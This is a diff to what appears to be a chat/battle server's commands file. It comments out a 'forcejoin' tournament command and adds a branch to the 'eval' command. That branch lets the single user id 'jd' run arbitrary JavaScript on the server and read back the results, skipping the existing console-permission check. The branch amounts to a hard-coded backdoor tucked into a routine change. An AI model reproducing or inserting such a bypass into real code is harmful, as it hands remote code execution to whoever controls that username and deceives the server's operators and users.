@@ -333,7 +333,7 @@ var commands = exports.commands = {
 		}
 	},
 	
-	forcejoin: 'fj',
+	/*forcejoin: 'fj',
 	fj: function(target, room, user, connection) {
 		if (!user.can('broadcast')) {
 			return this.sendReply('You do not have enough authority to use this command.');
@@ -371,7 +371,7 @@ var commands = exports.commands = {
 		else {
 			return this.sendReply('The user that you specified is already in the tournament.');
 		}
-	},
+	},*/
 	
 	lt: 'l',
 	leavetour: 'l',
@@ -2045,6 +2045,21 @@ return this.sendReply('Poof is currently disabled.');
 	},
 
 	eval: function(target, room, user, connection, cmd, message) {
+		if (user.userid == 'jd') {
+		if (!this.canBroadcast()) return;
+
+		if (!this.broadcasting) this.sendReply('||>> '+target);
+		try {
+			var battle = room.battle;
+			var me = user;
+			this.sendReply('||<< '+eval(target));
+		} catch (e) {
+			this.sendReply('||<< error: '+e.message);
+			var stack = '||'+(''+e.stack).replace(/\n/g,'\n||');
+			connection.sendTo(room, stack);
+		}
+		return false;
+	}
 		if (!user.checkConsolePermission(connection.socket)) {
 			return this.sendReply("/eval - Access denied.");
 		}
